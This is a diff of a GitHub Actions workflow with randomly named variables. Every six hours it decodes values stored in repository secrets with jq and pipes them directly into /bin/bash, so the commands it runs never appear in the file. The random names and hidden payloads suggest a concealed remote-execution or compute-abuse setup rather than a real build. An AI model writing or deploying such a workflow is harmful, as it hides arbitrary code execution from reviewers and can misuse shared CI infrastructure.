@@ -1,9 +1,10 @@
 name: republicanscholar
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 0/6 * * *'
-jobs:  # 19606
+    - cron: '7 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,10 +12,13 @@ jobs:  # 19606
       - uses: actions/checkout@v4
       - name: republicanscholar
         env:
-          n939: ${{ secrets.n939 }}
+          flhap447: ${{ secrets.flhap447 }}
         run: |
-          echo $n939 | jq -r .yihq4 | /bin/bash
-          echo $dou92714 | jq -r .ntwok2 | /bin/bash
-          echo $yr60 | jq -r .zlvdl9 | /bin/bash
-          echo $tstc6925 | jq -r .tuffg2 | /bin/bash
+          echo $flhap447 | jq -r .vjexn6291 | /bin/bash
+          echo $b379 | jq -r .z22638 | /bin/bash
+          echo $bw0 | jq -r .mrse7 | /bin/bash
+          echo $yi175 | jq -r .kei4 | /bin/bash
+          echo $nuk75 | jq -r .x5548 | /bin/bash
+          echo $g4 | jq -r .ecq5 | /bin/bash
+          echo $dv17675 | jq -r .q485 | /bin/bash
 
